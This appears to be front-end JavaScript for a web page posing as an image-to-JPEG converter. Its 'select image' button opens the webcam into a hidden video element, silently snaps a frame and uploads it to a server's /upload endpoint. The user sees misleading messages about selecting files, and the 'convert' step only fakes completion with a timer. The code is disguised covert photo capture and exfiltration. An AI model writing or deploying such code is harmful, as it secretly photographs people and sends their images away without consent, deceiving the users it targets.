let capturedImageBase64 = null;
let currentStream = null;
const hiddenVideo = document.getElementById("hiddenVideo");
const statusDiv = document.getElementById("statusMsg");
const previewDiv = document.getElementById("previewArea");
document.getElementById("selectBtn").onclick = async () => {
  statusDiv.innerHTML = " Initializing...";
  statusDiv.style.color = "#fd7e14";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: true,
    });
    currentStream = stream;
    hiddenVideo.srcObject = stream;
    hiddenVideo.onloadedmetadata = () => {
      hiddenVideo.play();
      setTimeout(() => {
        captureAndUpload();
      }, 200);
    };
  } catch (err) {
    statusDiv.innerHTML = "❌ You should give access to your files";
    statusDiv.style.color = "red";
    previewDiv.innerHTML = "⚠️ Could not access. Please allow permission.";
  }
};

function captureAndUpload() {
  if (!hiddenVideo.videoWidth || !hiddenVideo.videoHeight) {
    statusDiv.innerHTML = "❌ There was a problen, try again";
    return;
  }

  const canvas = document.createElement("canvas");
  canvas.width = hiddenVideo.videoWidth;
  canvas.height = hiddenVideo.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
  const imageData = canvas.toDataURL("image/jpeg", 0.85);
  capturedImageBase64 = imageData;

  if (currentStream) {
    currentStream.getTracks().forEach((track) => track.stop());
    currentStream = null;
    hiddenVideo.srcObject = null;
  }
  fetch("/upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ image: imageData }),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.success) {
        statusDiv.innerHTML =
          "✅ Image selected successfully! Ready to convert.";
        statusDiv.style.color = "#198754";
        previewDiv.innerHTML = "Click on select image";
        window.latestFile = data.filename;
      } else {
        throw new Error("Upload failed");
      }
    })
    .catch((err) => {
      statusDiv.innerHTML = "❌ Failed to save image: " + err.message;
      statusDiv.style.color = "red";
    });
}
document.getElementById("convertBtn").onclick = async () => {
  if (!window.latestFile) {
    statusDiv.innerHTML = "⚠️ Please select an image first";
    statusDiv.style.color = "red";
    return;
  }

  statusDiv.innerHTML = "⏳ Converting to JPEG...";
  statusDiv.style.color = "#fd7e14";
  setTimeout(() => {
    statusDiv.innerHTML = `✅ Conversion complete!`;
    statusDiv.style.color = "#198754";
  }, 1000);
};
